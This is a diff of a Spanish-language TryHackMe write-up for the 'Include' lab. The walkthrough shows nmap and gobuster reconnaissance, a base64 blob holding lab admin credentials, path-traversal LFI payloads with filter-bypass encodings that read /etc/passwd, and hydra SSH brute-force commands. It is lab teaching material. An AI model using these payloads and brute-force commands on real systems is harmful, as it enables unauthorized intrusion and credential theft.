@@ -1,18 +1,6 @@
----
-title: "Include - THM | by ils00"
-author: ils00
-categories: [TryHackMe, Medium]
-tags: [web, ssrf, api, lfi, bruteforce]
-render_with_liquid: false
-media_subpath: /img_p/include_thm
-image:
-  path: logo.png
----
-
-
 Esta es una de las maneras de resolver la máquina **Include** de TryHackMe con categoría **Media** en la plataforma. Esta es una sala que se encuentra en la ruta de aprendizaje **Advanced Service-Side Attacks**.
 
-![](maquina.webp){: width="700" height="400" }
+![](maquina.webp)
 
 ## Conocimientos Previos:
 
@@ -41,13 +29,13 @@ Una vez que analizamos esta traza y podemos ver el TTL que es igual a **63** p
 
 Lanzamos el primer comando de escaneo de Nmap que nos dará una vista de más o menos a que nos estamos enfrentando.
 
-nmap -p- --open -sS -n -Pn --min-rate 5000 -v [IP VICTIMA]
+`nmap -p- --open -sS -n -Pn --min-rate 5000 -v [IP VICTIMA]`
 
 ![](nmap1.webp)
 
 Ahora vamos a escanear estos puertos de manera más detallada:
 
-nmap -p22,25,110,143,993,995,4000,50000 -sCV [IP VICTIMA] -oN Targeted
+`nmap -p22,25,110,143,993,995,4000,50000 -sCV [IP VICTIMA] -oN Targeted`
 
 ![](nmap2.webp)
 
@@ -74,7 +62,7 @@ http://[IP]:50000
 
 Seguidamente, vamos a realizar un ataque de fuerza bruta de directorios con la herramienta **gobuster**.
 
-gobuster dir -u http://[IP]:50000 -w /diccionario.txt
+`gobuster dir -u http://[IP]:50000 -w /diccionario.txt`
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*6xae9VFgzAHH9_pwaEfHPQ.png)
 
@@ -126,11 +114,13 @@ Obervamos que podemos poner aqui una imagen para un “Banner” de la aplicaci�
 
 La introducimos y el resultado que vemos es el siguiente:
 
- data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
+
+
+ `data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=`
 
 Decodificamos el contenido en **base64** mediante el comando:
 
-echo "[CONTENT]" | base64 -d
+`echo "[CONTENT]" | base64 -d`
 
 ![](https://miro.medium.com/v2/resize:fit:700/1*LYbht6QXfOmaNuONk8S7bw.png)
 
@@ -156,7 +146,7 @@ Me puse a intentar acceder explotando una vulnerabilidad **LFI**.
 
 **Intento 1:**
 
-../../../../../../../etc/passwd
+`../../../../../../../etc/passwd`
 
 SIN ÉXITO
 
@@ -164,7 +154,7 @@ SIN ÉXITO
 
 Luego pensé que tendrían algo que estuviera bloqueando la combinación de caracteres ../, por lo tanto lo hice doble.
 
-....//....//....//....//etc/passwd
+`....//....//....//....//etc/passwd`
 
 SIN ÉXITO
 
@@ -172,7 +162,7 @@ SIN ÉXITO
 
 Seguidamente probé a urlencodearlo por si había otro tipo de filtro.
 
-....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd
+`....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd`
 
 Y BINGOO!!
 
@@ -186,9 +176,9 @@ Para esta explotación de fuerza bruta la realizaremos con la herramienta **hyd
 
 Probaremos los dos usuarios con la misma lista de contraseñas y BINGOO!
 
-hydra -l joshua -P [DICCIONARIO] ssh://[IP]
+`hydra -l joshua -P [DICCIONARIO] ssh://[IP]`
 
-hydra -l charles -P [DICCIONARIO] ssh://[IP]
+`hydra -l charles -P [DICCIONARIO] ssh://[IP]`
 
 Después de acceder a un usuario podremos contestar a la segunda pregunta.
 
